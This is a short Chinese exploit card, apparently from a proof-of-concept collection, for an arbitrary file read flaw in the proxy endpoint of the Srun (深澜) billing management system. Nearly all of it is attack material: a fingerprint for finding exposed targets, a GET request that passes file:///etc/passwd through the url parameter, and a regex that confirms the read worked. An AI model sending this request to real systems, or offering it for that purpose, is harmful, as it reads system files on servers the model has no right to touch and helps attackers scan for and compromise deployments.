# 深澜计费管理系统proxy任意文件读取漏洞

深澜计费管理系统proxy ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/js/lib/slimscroll.js"`
- **请求**：`GET /demo/proxy?url=file:///etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$